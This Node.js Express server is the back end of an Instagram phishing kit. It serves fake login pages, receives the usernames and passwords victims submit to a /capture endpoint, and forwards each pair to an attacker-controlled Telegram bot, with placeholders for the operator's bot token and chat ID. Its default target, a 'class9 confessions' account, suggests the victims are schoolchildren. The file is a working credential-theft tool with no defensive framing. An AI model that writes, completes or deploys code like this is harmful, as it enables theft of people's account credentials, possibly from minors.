const express = require('express');
const cors = require('cors');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 3000;

// ←←← PUT YOUR DETAILS HERE
const TELEGRAM_TOKEN = "7123456789:AAFxxxxxxxxxxxxxxxxxxxxxxxxxxxx";   // Your bot token
const CHAT_ID = "123456789";                                           // Your chat ID

app.use(cors());
app.use(express.json());
app.use(express.static(__dirname));   // serves index.html and 1.html

app.post('/capture', async (req, res) => {
    const { username, password, target, time } = req.body || {};

    if (!username || !password) {
        return res.json({ success: true });
    }

    console.log(`[CAPTURED] Username: ${username}`);

    // Nice formatted message with spoiler for password
    const message = `
*Instagram Login Captured* 🔥

*Username / Email:* ${username}
*Password:* ||${password}||
*Target:* ${target || "smrj.class9.confessions"}
*Time:* ${time ? new Date(time).toLocaleString() : new Date().toLocaleString()}
    `.trim();

    try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: "MarkdownV2"
            })
        });
        console.log("✅ Sent to Telegram successfully");
    } catch (err) {
        console.error("❌ Telegram send failed:", err.message);
    }

    res.json({ success: true });
});

app.listen(PORT, () => {
    console.log(`🚀 Server running on http://localhost:${PORT}`);
    console.log("Test a login and check your Telegram!");
});
